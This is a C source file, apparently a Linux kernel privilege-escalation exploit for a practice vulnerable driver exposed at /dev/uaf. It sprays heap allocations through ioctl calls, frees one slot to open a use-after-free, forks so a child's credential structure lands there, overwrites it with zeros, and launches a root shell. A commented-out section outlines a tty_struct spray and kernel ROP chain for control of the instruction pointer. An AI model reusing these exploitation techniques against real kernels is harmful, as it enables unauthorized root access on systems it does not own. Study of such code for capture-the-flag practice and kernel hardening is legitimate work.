#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<sys/ioctl.h>
#include "template.h"

//author : afang
//comment: what a nice day, isn't it?!

int main(int argc, char* argv[]){

	char *dev = "/dev/uaf";
	//char *buf = "I'm inside kernel.\n";
	int fd = open(dev, O_RDWR);

	int fd_lst[100];
	struct temp{
		size_t length;
		char *buf;
		size_t idx;
	}a1;
	a1.length = 0xa8;
	a1.idx = 20;
	struct temp *test = &a1;

	//Step0: spray to make no gap between chunks.
	for(int i = 0; i < 100; i++){
		int fd = open(dev, O_RDWR);
		fd_lst[i] = fd;
		test->idx = i;
		printf("%d\n", i);
		ioctl(fd, 'd', test);
	}
	for(int j = 0;j < 30; j++){
		test->idx = j;
		ioctl(fd_lst[j], 'd', test);
	}

	//Step1: free objects , create hole for tty_structs...
	for(int x = 20; x < 21; x++){
		test->idx = x;
		ioctl(fd_lst[x], 'c', test);
	}	

	//Step2: fork a new process, it's tty_struct will be located at somewhere near target position...
	//Step3: both triggers overflow into child process's cred struct.
	//ioctl(fd_lst[20], 'a', test);
	//check retrival.
	//printf("%x %x %x \n", *(int*)(test->buf+4), *(int*)(test->buf+8), *(int*)(test->buf+12));
	//exploit uaf to fulfill potential creds' struct first 0x18 parameters into zeros. 
	int pid = fork();
	test->idx = 20;
	test->length = 0x1c;
	test->buf = (char*)malloc(0x30);

	memset(test->buf, 0, 0x1c);
	for(int i = 20; i < 21; i++){
		test->idx = i;
		ioctl(fd_lst[i], 'b', test);
	}
	if(!pid){
		//child process starts shell.
		printf("launch!\n");
		system("/bin/sh");
	}else{
		wait(0);
	}
	

	/*
	//Step4: rsp will pointing to 0x8100008a here.
	//try to mmap to this place and put rop here.
	prepare_tf();
	kernel_rop_escalate(xchgeaxesp_addr & 0xffffffff);	
	
	printf("spray to get control of rip: \n");
	//Step5: trigger ops to control kernel rip...
	for(int i = 0; i < 100; i++){
		ioctl(ptmx_fd_lst[i], 0, 0);
	}
	*/
	return 0;
}
